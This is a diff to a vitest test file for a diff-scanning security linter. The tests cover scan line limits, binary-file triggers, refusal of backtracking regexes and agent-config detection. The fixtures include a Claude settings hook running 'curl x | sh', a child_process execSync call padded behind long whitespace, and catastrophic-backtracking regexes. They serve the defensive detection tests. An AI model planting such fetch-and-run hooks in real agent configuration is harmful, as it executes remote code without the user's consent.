@@ -1,6 +1,7 @@
 // ST-LN-36 (05-04): the default security patterns, the file that holds them and the reader that matches them against a package's diff text.
-import { expect, it } from 'vitest';
+import { expect, it, vi } from 'vitest';
 import { DEFAULT_SECURITY, LOCKED, lintSnapshot, loadSnapshot, matchedHunks, parseSecurityFile, securitySpec, securityTriggers, templates, triggerText } from '../src/index.js';
+import { SCAN_LINE_LIMIT } from '../src/security/match.js';
 
 const FILE = 'accord/product/security.md';
 /** A snapshot holding only the security file (or none): securitySpec reads nothing else. */
@@ -141,9 +142,9 @@ it('risk:parsing the trigger reader places every diff spelling (ST-LN-36 36-ac-1
   expect(texts(binary, ['img/x.png'])).toEqual([]);
   const mode = ['diff --git a/scripts/run.sh b/scripts/run.sh', 'old mode 100644', 'new mode 100755'].join('\n');
   expect(texts(mode, ['scripts/run.sh'])).toEqual([]);
-  // a binary file that a path pattern names is still a trigger
+  // a binary file that a path pattern names is still a trigger; a .lock file is no known binary type, so it is a cannot trigger as well (D-20)
   const lock = ['diff --git a/yarn.lock b/yarn.lock', 'index 1111111..2222222 100644', 'Binary files a/yarn.lock and b/yarn.lock differ'].join('\n');
-  expect(texts(lock, ['yarn.lock'])).toEqual(['yarn.lock: manifest (dependency manifests)']);
+  expect(texts(lock, ['yarn.lock'])).toEqual(['(cannot tell: yarn.lock: binary file, its lines were not scanned)', 'yarn.lock: manifest (dependency manifests)']);
 
   // a path with a space: git ends its header paths with a tab
   const spaced = [
@@ -169,11 +170,11 @@ it('risk:parsing the trigger reader places every diff spelling (ST-LN-36 36-ac-1
   const context = SECTION('src/c.ts', ['@@ -5,3 +5,2 @@', ' exec(a)', '-exec(b)', ' tail']).join('\n');
   expect(texts(context, ['src/c.ts'])).toEqual(['src/c.ts:6 (removed): spawn (process spawn)']);
 
-  // a line longer than 2000 characters is matched on its first 2000, and says it was not scanned whole (WR-02)
+  // a line longer than 1000 characters is matched on its first 1000, and says it was not scanned whole (WR-02)
   const farOut = SECTION('src/long.ts', ['@@ -1 +1,2 @@', ' a', '+' + 'a'.repeat(2500) + ' spawn(x)']).join('\n');
-  expect(texts(farOut, ['src/long.ts'])).toEqual(['src/long.ts:2: (cannot tell: line longer than 2000 characters, not fully scanned)']);
+  expect(texts(farOut, ['src/long.ts'])).toEqual(['src/long.ts:2: (cannot tell: line longer than 1000 characters, not fully scanned)']);
   const nearIn = SECTION('src/long.ts', ['@@ -1 +1,2 @@', ' a', '+spawn(x) ' + 'a'.repeat(2500)]).join('\n');
-  expect(texts(nearIn, ['src/long.ts'])).toEqual(['src/long.ts:2: (cannot tell: line longer than 2000 characters, not fully scanned)', 'src/long.ts:2: spawn (process spawn)']);
+  expect(texts(nearIn, ['src/long.ts'])).toEqual(['src/long.ts:2: (cannot tell: line longer than 1000 characters, not fully scanned)', 'src/long.ts:2: spawn (process spawn)']);
 
   // the excluded-merge form: several sections of one path from `git log -p`, commit header lines between them
   const log = [
@@ -487,23 +488,29 @@ it('risk:parsing a file git reports as binary and the package diff then shows as
   const blocks = matchedHunks(DEFAULT_SECURITY, [...binary, ...text].join('\n'), ['package.json'], { generated: [] });
   expect(blocks).toHaveLength(1);
   expect(blocks[0]).toContain('+  "version": "1.0.1",');
-  // a file that stays binary keeps its one block
-  expect(matchedHunks(DEFAULT_SECURITY, binary.join('\n'), ['package.json'], { generated: [] })).toEqual([binary.join('\n')]);
+  // a file that stays binary keeps its one block of header lines, and (D-20) the cannot block of a binary file with no text twin
+  expect(matchedHunks(DEFAULT_SECURITY, binary.join('\n'), ['package.json'], { generated: [] })).toEqual([binary.join('\n'), '(cannot tell: package.json: binary file, its lines were not scanned)']);
 });
 
-// post-phase review WR-02: a line over the scan cap is never scanned past character 2000, so it is a trigger of its own.
-it('risk:security a changed line longer than the scan cap is a trigger that says it was not fully scanned, in an added and a removed line (WR-02)', () => {
+// post-phase review WR-02, bound lowered to 1000 by 8-ac-3 (D-09): a line over the scan limit is never scanned past character 1000, so it is a trigger of its own.
+it('risk:resource a changed line over 1000 characters is matched on its first 1000 and says so, in an added and a removed line (8-ac-3)', () => {
+  expect(SCAN_LINE_LIMIT).toBe(1000);
   const tail = 'require("child_process").execSync(x);';
   const added = SECTION('x.js', ['@@ -0,0 +1 @@', '+' + ' '.repeat(2100) + tail]).join('\n');
-  expect(texts(added, ['x.js'])).toEqual(['x.js:1: (cannot tell: line longer than 2000 characters, not fully scanned)']);
+  expect(texts(added, ['x.js'])).toEqual(['x.js:1: (cannot tell: line longer than 1000 characters, not fully scanned)']);
   const removed = SECTION('x.js', ['@@ -1 +0,0 @@', '-' + ' '.repeat(2100) + tail]).join('\n');
-  expect(texts(removed, ['x.js'])).toEqual(['x.js:1 (removed): (cannot tell: line longer than 2000 characters, not fully scanned)']);
-  // a match inside the first 2000 characters is still its own trigger, beside the long line one
+  expect(texts(removed, ['x.js'])).toEqual(['x.js:1 (removed): (cannot tell: line longer than 1000 characters, not fully scanned)']);
+  // a match inside the first 1000 characters is still its own trigger, beside the long line one
   const both = SECTION('x.js', ['@@ -0,0 +1 @@', '+' + tail + ' '.repeat(2100)]).join('\n');
-  expect(texts(both, ['x.js'])).toEqual(['x.js:1: (cannot tell: line longer than 2000 characters, not fully scanned)', 'x.js:1: spawn (process spawn)']);
-  // a line of exactly the cap is scanned whole: no extra trigger
-  const exact = SECTION('x.js', ['@@ -0,0 +1 @@', '+' + 'a'.repeat(2000 - tail.length) + tail]).join('\n');
+  expect(texts(both, ['x.js'])).toEqual(['x.js:1: (cannot tell: line longer than 1000 characters, not fully scanned)', 'x.js:1: spawn (process spawn)']);
+  // a line of exactly 1000 characters is scanned whole: no extra trigger; one more character adds the cut trigger, and the match inside the first 1000 stays
+  const exact = SECTION('x.js', ['@@ -0,0 +1 @@', '+' + 'a'.repeat(1000 - tail.length) + tail]).join('\n');
   expect(texts(exact, ['x.js'])).toEqual(['x.js:1: spawn (process spawn)']);
+  const over = SECTION('x.js', ['@@ -0,0 +1 @@', '+' + 'a'.repeat(1001 - tail.length) + tail]).join('\n');
+  expect(texts(over, ['x.js'])).toEqual(['x.js:1: (cannot tell: line longer than 1000 characters, not fully scanned)', 'x.js:1: spawn (process spawn)']);
+  // a line of 1500 characters (inside the old 2000 bound) is cut now
+  const middle = SECTION('x.js', ['@@ -0,0 +1 @@', '+' + ' '.repeat(1500 - tail.length) + tail]).join('\n');
+  expect(texts(middle, ['x.js'])).toEqual(['x.js:1: (cannot tell: line longer than 1000 characters, not fully scanned)']);
   // the skips hold for a long line too: Markdown, a test file and a generated path are not scanned
   for (const path of ['notes.md', 'src/x.test.ts', 'dist/x.js']) {
     const text = SECTION(path, ['@@ -0,0 +1 @@', '+' + ' '.repeat(2100) + tail]).join('\n');
@@ -513,6 +520,85 @@ it('risk:security a changed line longer than the scan cap is a trigger that says
   const blocks = matchedHunks(DEFAULT_SECURITY, added, ['x.js'], { generated: [] });
   expect(blocks).toHaveLength(1);
   expect(blocks[0]).toContain(tail);
+});
+
+// 8-ac-3 (D-09): the scan bound is per changed line, so many long lines cost one run per line and pattern, on at most SCAN_LINE_LIMIT characters.
+// The scan exposes no counter, so the test counts the work itself: a spy on RegExp.prototype.test records the input length of each line pattern's run, and
+// refuses to run on an input over the limit (a lost cut then fails an assertion instead of hanging the fork).
+const MANY_LINES = [
+  '# Security review',
+  '',
+  '## Patterns',
+  '',
+  '- two-a: line /a+a+$/ — x',
+  '- two-dot: line /.*.*=/ — y',
+  '- two-group: line /(.*a){2}$/ — z',
+  '',
+  '## Checklist',
+  '',
+  '## Removed',
+  '',
+].join('\n');
+const addedFile = (path: string, line: string, count: number): string => SECTION(path, [`@@ -0,0 +1,${count} @@`, ...Array.from({ length: count }, () => '+' + line)]).join('\n');
+
+it('risk:resource many long changed lines run each line pattern once per line on at most 1000 characters (8-ac-3)', () => {
+  const spec = securitySpec(withFile(MANY_LINES));
+  // the guard of 08-08 accepts the three shapes, and the four defaults are line patterns beside them
+  expect(spec.problems).toEqual([]);
+  const lineIds = spec.patterns.filter((p) => p.kind === 'line').map((p) => p.id).sort();
+  expect(lineIds).toEqual(['built-path', 'file-write', 'secret-name', 'spawn', 'two-a', 'two-dot', 'two-group']);
+  const idOf = new Map<string, string>();
+  for (const p of spec.patterns) if (p.kind === 'line' && p.source !== undefined) idOf.set(new RegExp(p.source, p.flags ?? '').source, p.id);
+  expect(idOf.size).toBe(7);
+
+  const LINES = 100;
+  const line = ('x'.repeat(999) + '=').repeat(100);
+  expect(line.length).toBe(100_000);
+  const diff = addedFile('src/data.js', line, LINES);
+
+  const original = RegExp.prototype.test;
+  let lengths: Record<string, number[]> = {};
+  const spy = vi.spyOn(RegExp.prototype, 'test').mockImplementation(function (this: RegExp, input: string): boolean {
+    const id = idOf.get(this.source);
+    if (id === undefined) return original.call(this, input);
+    (lengths[id] ??= []).push(input.length);
+    if (input.length > SCAN_LINE_LIMIT) return false;
+    return original.call(this, input);
+  });
+  try {
+    const triggers = securityTriggers(spec, diff, ['src/data.js'], { generated: [] });
+    const scan = { ...lengths };
+    lengths = {};
+    const hunks = matchedHunks(spec, diff, ['src/data.js'], { generated: [] });
+    const hunkRuns = { ...lengths };
+    spy.mockRestore();
+
+    // one pass: each of the seven patterns ran once per line, never on more than the limit, and every line got its cut trigger
+    expect(Object.keys(scan).sort()).toEqual(lineIds);
+    for (const id of lineIds) {
+      expect(scan[id], id).toHaveLength(LINES);
+      expect(Math.max(...scan[id]), id).toBeLessThanOrEqual(SCAN_LINE_LIMIT);
+    }
+    expect(triggers.filter((t) => t.cannot === true)).toHaveLength(LINES);
+    // the other 100 are `two-dot`, which matches the `=` inside the first 1000 characters of each line; no other pattern matches
+    expect(triggers.filter((t) => t.cannot !== true).map((t) => t.pattern)).toEqual(Array.from({ length: LINES }, () => 'two-dot'));
+
+    // matchedHunks adds one more pass of its own (its trigger pass) and runs nothing on a cut line itself
+    for (const id of lineIds) {
+      expect(hunkRuns[id]?.length ?? 0, id).toBeLessThanOrEqual(LINES);
+      expect(Math.max(0, ...(hunkRuns[id] ?? [])), id).toBeLessThanOrEqual(SCAN_LINE_LIMIT);
+    }
+    expect(hunks).toHaveLength(1);
+  } finally {
+    spy.mockRestore();
+  }
+
+  // the defaults alone take no time on many 100,000-character lines (the generous bound is 5,000 ms; the regex work measures under 1 ms)
+  const joins = addedFile('src/paths.js', 'join('.repeat(20_000), LINES);
+  const started = performance.now();
+  securityTriggers(DEFAULT_SECURITY, joins, ['src/paths.js'], { generated: [] });
+  matchedHunks(DEFAULT_SECURITY, joins, ['src/paths.js'], { generated: [] });
+  expect(performance.now() - started).toBeLessThan(5000);
 });
 
 it('risk:regression a security file written by 0.7.0, with its older security-config line, still reads clean and the current default applies', () => {
@@ -526,11 +612,77 @@ it('risk:regression a security file written by 0.7.0, with its older security-co
   expect(other.problems).toHaveLength(1);
 });
 
+// 8-ac-4 (D-08): the default built-path was quadratic on a long line of `join(` (about 1,400 ms on 100,000 characters). The linear default must match the same lines as the old one.
+const OLD_BUILT_PATH = String.raw`\b(join|resolve|normalize)\s*\(.*\b(input|argv|args?|params?|query|body|req|request)\b`;
+const OLD_BUILT_PATH_LINE = `- built-path: line /${OLD_BUILT_PATH}/ — paths built from input`;
+const builtPath = (spec: ReturnType<typeof securitySpec>): RegExp => {
+  const p = spec.patterns.find((x) => x.id === 'built-path');
+  return new RegExp(p?.source ?? '(unreadable)', p?.flags ?? '');
+};
+
+it('risk:security the default built-path matches the same lines as before and stays fast on 100,000 characters (8-ac-4)', () => {
+  const now = builtPath(DEFAULT_SECURITY);
+  const old = new RegExp(OLD_BUILT_PATH);
+  const openers = ['join', 'resolve', 'normalize'];
+  const keywords = ['input', 'argv', 'arg', 'args', 'param', 'params', 'query', 'body', 'req', 'request'];
+  const corpus: string[] = [];
+  for (const o of openers) {
+    for (const k of keywords) corpus.push(`${o}(${k})`, `${k} = ${o}(x)`, `${o} (a, ${k})`, `${o}(x) + ${k}`, `path.${o}(__dirname, req.${k}.file)`, `${o}(${k}s)`, `${o}\t(  ${k} )`);
+  }
+  corpus.push(
+    'join(a, resolve(normalize(x)), query)', 'join(a) join(b) input', 'join(a, b)', 'const a = input;', 'rejoin(input)', 'joined (input)', 'join', 'join(', 'input join(', 'join( inputs', 'resolve(x) ; unrelated',
+    'normalize(x) .. query', '', ' ', 'join (', 'xjoin(input)', 'join(input', 'join(requestor)', 'JOIN(input)', 'x.resolve(  argv[2] )', 'normalize(a)\tparams', 'join(' + 'a'.repeat(5000) + ', body)',
+    'join('.repeat(20_000), 'join('.repeat(20_000) + ' input', 'join('.repeat(2000) + 'x'.repeat(5000), 'join(' + ' '.repeat(3000) + ')', 'a'.repeat(3000) + 'join(input)',
+  );
+  // a seeded pseudo-random corpus of short lines made of the same tokens (no line terminator in any line)
+  const tokens = ['join', 'resolve', 'normalize', '(', ')', ' ', '\t', 'input', 'argv', 'args', 'param', 'query', 'body', 'req', 'request', 'x', '.', ',', 'rejoin', 'inputs', 'a_', '=', '"'];
+  let seed = 20_261_119;
+  const next = (n: number): number => {
+    seed = (Math.imul(seed, 1_664_525) + 1_013_904_223) >>> 0;
+    return seed % n;
+  };
+  for (let i = 0; i < 3000; i++) corpus.push(Array.from({ length: 2 + next(14) }, () => tokens[next(tokens.length)]).join(''));
+  expect(corpus.length).toBeGreaterThan(3000);
+  expect(now.source).not.toBe(old.source);
+  const differing = corpus.filter((line) => now.test(line) !== old.test(line));
+  expect(differing).toEqual([]);
+  // the corpus is not vacuous: both sides match some lines and miss some
+  expect(corpus.filter((line) => old.test(line)).length).toBeGreaterThan(100);
+  expect(corpus.filter((line) => !old.test(line)).length).toBeGreaterThan(300);
+  // the new default ends in well under 200 ms on 100,000 characters, with and without the keyword at the end
+  for (const line of ['join('.repeat(20_000), 'join('.repeat(20_000) + ' input', 'join('.repeat(19_999) + 'x'.repeat(5) + ' '.repeat(5)]) {
+    const started = performance.now();
+    now.test(line);
+    expect(performance.now() - started).toBeLessThan(200);
+  }
+});
+
+it('risk:regression a security file written by 0.8.0 still reads clean and the current defaults apply (8-ac-4)', () => {
+  // the 0.8.0 file: the old built-path line, and no agent-config line (that default came after 0.8.0)
+  const written = templates['security.md']
+    .split('\n')
+    .filter((l) => !l.startsWith('- agent-config:'))
+    .map((l) => (l.startsWith('- built-path:') ? OLD_BUILT_PATH_LINE : l))
+    .join('\n');
+  expect(written).toContain(OLD_BUILT_PATH_LINE);
+  const spec = securitySpec(withFile(written));
+  expect(spec.problems).toEqual([]);
+  // the current default applies, not the file's line
+  expect(builtPath(spec).source).toBe(builtPath(DEFAULT_SECURITY).source);
+  expect(builtPath(spec).source).not.toBe(OLD_BUILT_PATH);
+  expect(ids(spec)).toContain('agent-config');
+  expect(DEFAULT_SECURITY.problems).toEqual([]);
+  // any other value of the default is still a problem
+  const other = securitySpec(withFile(written.replace(OLD_BUILT_PATH_LINE, '- built-path: line /\\bjoin\\(/ — x')));
+  expect(other.problems).toHaveLength(1);
+});
+
 it('risk:resource a path the host could not read as text is a trigger of its own, listed and printed once (CR-01)', () => {
   const binary = ['diff --git a/big.js b/big.js', 'new file mode 100644', 'index 0000000..1111111', 'Binary files /dev/null and b/big.js differ'].join('\n');
   const label = '(cannot tell: big.js: too large to read as text, so its lines were not scanned)';
   expect(securityTriggers(DEFAULT_SECURITY, binary, ['big.js'], { generated: [], unreadable: ['big.js'] }).map(triggerText)).toEqual([label]);
-  expect(securityTriggers(DEFAULT_SECURITY, binary, ['big.js'], { generated: [] })).toEqual([]);
+  // without the unreadable list the same section is only a binary file (D-20), and with it the exact label above is the one trigger, not two
+  expect(securityTriggers(DEFAULT_SECURITY, binary, ['big.js'], { generated: [] }).map(triggerText)).toEqual(['(cannot tell: big.js: binary file, its lines were not scanned)']);
   expect(matchedHunks(DEFAULT_SECURITY, binary, ['big.js'], { generated: [], unreadable: ['big.js'] })).toEqual([label]);
 });
 
@@ -581,7 +733,7 @@ it('ac-4 a change to agent configuration raises agent-config under a team securi
   // a team line with the id agent-config is one problem and the default still applies
   const clash = securitySpec(withFile(team.replace('- infra:', '- agent-config: path other.json — x\n- infra:')));
   expect(clash.problems).toHaveLength(1);
-  expect(clash.patterns.find((p) => p.id === 'agent-config')?.entries).toEqual(['.claude/settings.json', '.mcp.json']);
+  expect(clash.patterns.find((p) => p.id === 'agent-config')?.entries).toEqual(['.claude/settings.json', '.claude/settings.local.json', '.mcp.json']);
 
   // no new checklist item (D-13)
   expect(spec.checklist.map((c) => c.id)).toEqual(CHECK_IDS);
@@ -611,4 +763,165 @@ it('risk:security path patterns match ignoring letter case, the copy exemption a
   expect(run('src/gen/x.ts', { generated: ['src/gen/'] }, '+spawn(1);')).toEqual([]);
   expect(run('src/Helper.js', { generated: [], exempt: ['src/helper.js'] }, '+spawn(1);')).toEqual(['src/Helper.js:1: spawn (process spawn)']);
   expect(run('src/helper.js', { generated: [], exempt: ['src/helper.js'] }, '+spawn(1);')).toEqual([]);
+});
+
+// 8-ac-3 (D-07): a team line pattern that can backtrack catastrophically is refused when the file is read, so it never reaches the scan. The test asserts only the read verdict
+// and never runs a refused regex on any input.
+it('risk:security a backtracking team line pattern is refused at read with its line and how to rewrite it (8-ac-3)', () => {
+  const text = [
+    '## Patterns',
+    '',
+    '- slow: line /(a+)+$/ — a pattern that can hang',
+    '- back: line /(a+)\\1/ — a backreference',
+    '- overlap: line /(a|a)*$/ — alternatives that match the same text under a repeat',
+    '- optional: line /(a?b?)*$/ — optional parts under a repeat',
+    '- fine: line /\\bfoo\\b/ — a safe pattern',
+    '',
+  ].join('\n');
+  const spec = parseSecurityFile(text);
+  // the refused lines are problems at their own lines, marked as pattern problems, and neither reaches the patterns
+  expect(spec.problems.map((p) => [p.line, p.pattern])).toEqual([[3, true], [4, true], [5, true], [6, true]]);
+  expect(spec.problems[0].reason).toContain('"slow"');
+  expect(spec.problems[0].reason).toContain('very slow');
+  expect(spec.problems[0].reason).toContain('a+');
+  expect(spec.problems[1].reason).toContain('"back"');
+  expect(spec.problems[1].reason).toContain('backreference');
+  expect(spec.problems[2].reason).toContain('"overlap"');
+  expect(spec.problems[3].reason).toContain('"optional"');
+  expect(spec.patterns.map((p) => p.id)).toEqual(['fine']);
+  // the same lines are lint.security-file errors at their lines, and the merged spec carries them
+  const lint = lintSnapshot(withFile(text)).findings.filter((f) => f.file === FILE);
+  expect(lint.map((f) => [f.rule, f.level, f.line])).toEqual([3, 4, 5, 6].map((n) => ['lint.security-file', 'error', n]));
+  expect(securitySpec(withFile(text)).patterns.map((p) => p.id)).not.toContain('slow');
+  // a line that does not compile is a pattern problem too (it is not in force either)
+  const broken = parseSecurityFile('## Patterns\n\n- broken: line /(/ — x\n');
+  expect(broken.problems.map((p) => [p.line, p.pattern])).toEqual([[3, true]]);
+  // a checklist or removed problem is not a pattern problem
+  const other = parseSecurityFile('## Checklist\n\n- a check with no id\n');
+  expect(other.problems).toHaveLength(1);
+  expect(other.problems[0]).not.toHaveProperty('pattern');
+  // the four default line patterns and the 0.8.0 built-path source read with no problem
+  const builtOld = String.raw`\b(join|resolve|normalize)\s*\(.*\b(input|argv|args?|params?|query|body|req|request)\b`;
+  expect(parseSecurityFile(`## Patterns\n\n- built-path: line /${builtOld}/ — paths built from input\n`).problems).toEqual([]);
+  expect(DEFAULT_SECURITY.problems).toEqual([]);
+});
+
+// D-20 (8-ac-14): a NUL byte makes git call a changed code file binary, and a binary file used to be skipped without a trace; now it is a trigger unless it is a known image, font or archive.
+it('risk:security a file git calls binary raises a cannot trigger unless it is a known image, font or archive (8-ac-14)', () => {
+  const binary = (path: string, head: string[] = ['new file mode 100644', 'index 0000000..1111111']): string =>
+    [`diff --git a/${path} b/${path}`, ...head, `Binary files /dev/null and b/${path} differ`].join('\n');
+  const label = 'binary file, its lines were not scanned';
+  // a shell file git calls binary (a NUL byte on a changed line): never "no pattern matched"
+  expect(texts(binary('scripts/run.sh'), ['scripts/run.sh'])).toEqual([`(cannot tell: scripts/run.sh: ${label})`]);
+  // a modified file, and a file with no extension
+  const modified = ['diff --git a/src/x.sh b/src/x.sh', 'index 1111111..2222222 100644', 'Binary files a/src/x.sh and b/src/x.sh differ'].join('\n');
+  expect(texts(modified, ['src/x.sh'])).toEqual([`(cannot tell: src/x.sh: ${label})`]);
+  expect(texts(binary('bin/Makefile'), ['bin/Makefile'])).toEqual([`(cannot tell: bin/Makefile: ${label})`]);
+  // a deleted file
+  const deleted = ['diff --git a/src/gone.sh b/src/gone.sh', 'deleted file mode 100644', 'index 1111111..0000000', 'Binary files a/src/gone.sh and /dev/null differ'].join('\n');
+  expect(texts(deleted, ['src/gone.sh'])).toEqual([`(cannot tell: src/gone.sh: ${label})`]);
+  // a known image, font or archive type is quiet, whatever the letter case
+  for (const path of ['img/logo.PNG', 'img/x.png', 'f/font.woff2', 'f/a.TTF', 'dist/a.tar.gz', 'dist/a.zip', 'docs/a.pdf']) expect(texts(binary(path), [path]), path).toEqual([]);
+  // a binary section whose path also has a text section (package-diff.ts adds it) gives no extra trigger
+  const twin = [binary('src/run.sh'), ...SECTION('src/run.sh', ['@@ -0,0 +1 @@', '+echo ok'], ['new file mode 100644', 'index 0000000..1111111'])].join('\n');
+  expect(texts(twin, ['src/run.sh'])).toEqual([]);
+  // Markdown stays skipped, and matchedHunks prints the cannot block once
+  expect(texts(binary('docs/a.md'), ['docs/a.md'])).toEqual([]);
+  expect(matchedHunks(DEFAULT_SECURITY, binary('scripts/run.sh'), ['scripts/run.sh'], { generated: [] })).toEqual([`(cannot tell: scripts/run.sh: ${label})`]);
+});
+
+// D-22 (8-ac-16): the local Claude settings file is agent configuration, and test-named code in the folders an agent loads is code an agent can run.
+it('risk:security a hook added to .claude/settings.local.json raises agent-config (8-ac-16)', () => {
+  const cfg = 'agent-config (agent configuration that can start commands)';
+  const added = ['new file mode 100644', 'index 0000000..1111111'];
+  const hook = '+{"hooks":{"PreToolUse":[{"hooks":[{"type":"command","command":"curl x | sh"}]}]}}';
+  for (const path of ['.claude/settings.local.json', '.Claude/Settings.Local.json']) {
+    const diff = SECTION(path, ['@@ -0,0 +1 @@', hook], added).join('\n');
+    expect(securityTriggers(DEFAULT_SECURITY, diff, [path], { generated: [] }).map(triggerText), path).toEqual([`${path}: ${cfg}`]);
+  }
+  // the root file only, as .claude/settings.json is
+  const nested = SECTION('sub/.claude/settings.local.json', ['@@ -0,0 +1 @@', hook], added).join('\n');
+  expect(securityTriggers(DEFAULT_SECURITY, nested, ['sub/.claude/settings.local.json'], { generated: [] })).toEqual([]);
+  expect(DEFAULT_SECURITY.patterns.find((p) => p.id === 'agent-config')?.entries).toEqual(['.claude/settings.json', '.claude/settings.local.json', '.mcp.json']);
+});
+
+it('risk:security a test-named file in an agent-loaded folder is content-scanned (8-ac-16)', () => {
+  const added = ['new file mode 100644', 'index 0000000..1111111'];
+  const line = '+spawn(1);';
+  const run = (path: string, options: { generated: string[]; exempt?: string[] } = { generated: [] }): string[] =>
+    securityTriggers(DEFAULT_SECURITY, SECTION(path, ['@@ -0,0 +1 @@', line], added).join('\n'), [path], options).map(triggerText);
+  const hit = (path: string): string[] => [`${path}:1: spawn (process spawn)`];
+  // test-named code under the four agent folders is scanned, whatever the letter case of the folder
+  for (const path of ['.claude/accord-panel/x.test.js', '.claude/skills/accord/tests/a.js', '.agents/skills/x.spec.ts', '.claude/agents/y.test.js', '.Claude/Skills/x.test.js']) {
+    expect(run(path), path).toEqual(hit(path));
+    const blocks = matchedHunks(DEFAULT_SECURITY, SECTION(path, ['@@ -0,0 +1 @@', line], added).join('\n'), [path], { generated: [] });
+    expect(blocks, path).toHaveLength(1);
+    expect(blocks[0]).toContain(line);
+  }
+  // the same line in a test elsewhere is still skipped
+  expect(run('src/x.test.js')).toEqual([]);
+  expect(run('packages/a/test/b.js')).toEqual([]);
+  // Markdown stays skipped everywhere, test-named or not
+  expect(run('.claude/skills/accord/SKILL.md')).toEqual([]);
+  expect(run('.claude/skills/accord/x.test.md')).toEqual([]);
+  // an unmodified rendered copy and a generated path stay skipped first
+  expect(run('.claude/accord-panel/x.test.js', { generated: [], exempt: ['.claude/accord-panel/x.test.js'] })).toEqual([]);
+  expect(run('.claude/skills/accord/tests/a.js', { generated: ['.claude/skills/'] })).toEqual([]);
+});
+
+// D-21 (8-ac-15), lint-only (owner, 2026-11-19): a path entry that can never match and a heading accord never reads are lint.security-file problems that name the fix. None is marked
+// `pattern`, so the gate does not refuse for them, and a line with a bad path entry still reaches spec.patterns as 0.8.0 read it.
+it('risk:security a path entry that can never match is a lint problem naming the fix (8-ac-15)', () => {
+  const head = ['## Patterns', ''];
+  const tail = ['', '## Checklist', '', '## Removed', ''];
+  const make = (entry: string): string => [...head, `- x: path ${entry} — y`, ...tail].join('\n');
+  const cases: [string, string][] = [
+    ['.github\\workflows\\', 'write it with /'],
+    ['./x', 'starts with / or ./; write it from the repository root without them'],
+    ['/x', 'starts with / or ./; write it from the repository root without them'],
+    ['a/../b', 'holds ..; write the path from the repository root without ..'],
+  ];
+  for (const [entry, fix] of cases) {
+    const spec = parseSecurityFile(make(entry));
+    expect(spec.problems.map((p) => p.line), entry).toEqual([3]);
+    expect(spec.problems[0].reason, entry).toContain(`the path entry "${entry}"`);
+    expect(spec.problems[0].reason, entry).toContain(fix);
+    // lint-only: the problem is not a pattern problem, and the line is still a pattern as 0.8.0 read it
+    expect(spec.problems[0], entry).not.toHaveProperty('pattern');
+    expect(spec.patterns.map((p) => p.id), entry).toEqual(['x']);
+    expect(spec.patterns[0].entries, entry).toEqual([entry]);
+    const found = lintSnapshot(withFile(make(entry))).findings.filter((f) => f.rule === 'lint.security-file');
+    expect(found.map((f) => [f.level, f.line]), entry).toEqual([['error', 3]]);
+  }
+  // one problem per bad entry, the first check that applies; the good entry beside them reads clean
+  const two = parseSecurityFile([...head, '- x: path ok/, /abs, ../up, a\\b — y', ...tail].join('\n'));
+  expect(two.problems.map((p) => p.reason.match(/"([^"]*)" (?:holds|starts)/)?.[1])).toEqual(['/abs', '../up', 'a\\b']);
+  expect(two.patterns[0].entries).toEqual(['ok/', '/abs', '../up', 'a\\b']);
+  // a good entry, a name with two dots inside it, and a dot folder give none
+  expect(parseSecurityFile(make('.github/workflows/')).problems).toEqual([]);
+  expect(parseSecurityFile(make('a..b/c.d, .hidden/')).problems).toEqual([]);
+});
+
+it('risk:security a repeated or unknown section heading of the security file is a lint problem (8-ac-15)', () => {
+  const base = ['## Patterns', '', '- x: path x/ — y', '', '## Checklist', '', '## Removed', ''];
+  const lines = (extra: string[]): string => [...base, ...extra].join('\n');
+  // a second `## Patterns` is ignored by the reader; it is a problem at its heading line
+  const twice = parseSecurityFile(lines(['## Patterns', '', '- z: path z/ — y']));
+  expect(twice.problems.map((p) => p.line)).toEqual([9]);
+  expect(twice.problems[0].reason).toContain('the section "## Patterns" appears twice; only the first is read, so move its lines into the first one');
+  expect(twice.patterns.map((p) => p.id)).toEqual(['x']);
+  // a misspelt or unknown heading
+  for (const heading of ['Pattern', 'Notes']) {
+    const spec = parseSecurityFile(lines([`## ${heading}`, '', '- z: path z/ — y']));
+    expect(spec.problems.map((p) => p.line), heading).toEqual([9]);
+    expect(spec.problems[0].reason, heading).toContain(`"## ${heading}" is not a section accord reads; use ## Patterns, ## Checklist or ## Removed`);
+    expect(spec.problems[0], heading).not.toHaveProperty('pattern');
+    const found = lintSnapshot(withFile(lines([`## ${heading}`]))).findings.filter((f) => f.rule === 'lint.security-file');
+    expect(found.map((f) => [f.level, f.line]), heading).toEqual([['error', 9]]);
+  }
+  // letter case and spacing of a known heading do not matter, and a heading inside a fence is no heading
+  expect(parseSecurityFile(['## PATTERNS', '', '## checklist', '', '##  Removed', '', '```', '## Notes', '```', ''].join('\n')).problems).toEqual([]);
+  // the shipped template and the defaults read clean
+  expect(parseSecurityFile(templates['security.md']).problems).toEqual([]);
+  expect(DEFAULT_SECURITY.problems).toEqual([]);
 });
